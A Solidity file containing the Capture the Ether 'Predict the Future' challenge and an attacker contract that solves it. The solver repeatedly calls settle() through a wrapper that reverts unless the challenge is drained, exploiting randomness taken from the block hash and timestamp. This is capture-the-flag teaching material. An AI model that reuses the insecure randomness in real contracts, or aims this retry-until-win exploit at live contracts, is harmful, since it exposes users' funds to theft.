// SPDX-License-Identifier: MIT

pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureSolution {
    PredictTheFutureChallenge public challenge;
    uint8 public guess;

    function PredictTheFutureSolution(address chAddress) public payable {
        challenge = PredictTheFutureChallenge(chAddress);
    }

    function lockInGuess(uint8 n) public payable {
        require(msg.value == 1 ether);
        guess = n;
        challenge.lockInGuess.value(1 ether)(guess);
    }

    function setGuess(uint8 n) public {
        guess = n;
    }

    function settle_last() public {
        challenge.settle();
        msg.sender.transfer(address(this).balance);
    }

    function settle() public {
        challenge.settle();
        require(challenge.isComplete());
        msg.sender.transfer(address(this).balance);
    }

    function () public payable {}
}